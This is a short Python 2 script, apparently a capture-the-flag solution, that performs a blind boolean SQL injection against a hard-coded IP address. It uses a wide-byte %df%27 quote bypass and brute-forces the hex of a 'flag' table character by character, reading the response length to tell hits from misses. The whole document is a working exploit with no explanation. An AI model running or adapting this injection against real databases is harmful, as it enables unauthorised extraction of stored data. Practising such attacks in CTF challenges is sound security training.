#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests
import string

url = "http://218.2.197.235:23733/index.php?key="
payload = "-1%df%27||left((select(hex(flag))from(flag)),{pos})=0x{c}%23"
req = requests.Session()
str = string.printable
char =''
flag = ''
end =0
for i in xrange(1,81):
    for s in str:
        char = (flag+s).encode('hex')
        endurl = (url+payload).format(pos = i,c = char)
       # print endurl
        r = req.get(endurl)
        #print r.text
        if len(r.text)>1000:
            flag +=s
            print flag
            break
        if s ==str[-1]:#搜索一圈都没搜到
            print "we get all!"
            end =1
            break
    if(end):
        break

print flag.decode('hex')